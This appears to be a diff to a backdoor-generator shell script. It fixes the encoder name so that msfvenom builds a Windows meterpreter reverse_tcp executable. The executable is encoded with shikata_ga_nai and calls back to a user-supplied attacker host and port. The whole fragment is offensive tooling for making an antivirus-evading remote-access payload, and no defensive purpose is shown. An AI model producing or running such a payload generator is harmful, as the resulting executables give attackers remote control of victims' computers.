@@ -514,7 +514,7 @@ read -p 'name : ' namebd
 
 if [ $osbd = "windows" ] 
 then
-msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd -e x86/shikata_gai_nai -i 2 lport=$portbd --platform windows -f exe -a x86 > $namebd.exe
+msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd -e x86/shikata_ga_nai -i 2 lport=$portbd --platform windows -f exe -a x86 > $namebd.exe
 echo
 echo
 echo
